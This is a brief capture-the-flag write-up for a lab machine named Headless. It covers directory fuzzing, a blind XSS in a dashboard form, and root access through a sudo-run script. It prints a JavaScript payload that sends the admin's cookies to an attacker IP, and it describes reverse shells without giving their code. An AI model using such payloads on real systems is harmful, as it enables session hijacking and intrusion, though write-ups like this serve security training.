---
description: python3 -c 'import pty; pty.spawn("/bin/bash")'
---

# Headless

# Site enumeration

On the site there is only a countdown but using ffuf we find a dashboard directory with a submit form feature lets try command injection.

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

This quite interesting and seems to have the potential to be a blind XSS injection. Lets test that theory....

And yes we are able to insert a source attribute that pings our nc server. We will now attempt to steal the admins cookies. We will do this by inserting the JS code.

```
new Image().src='http://10.10.16.5/index?c='+document.cookie
```

And now we have the admins cookie and can access the dashboard as admin!!

# Priv esc

If we play around we can get command execution on the box using this setup...

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

We can use this to get a reverse shell. Once we are in we run sudo -l and see we can run this binary as root.

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Lets analyise it. It seema it will run initdb.sh as root if we create the file in our home directory. So all we need to do is create the file and insert a simple reverse shell into it. And we get root!!

PWNDDDD
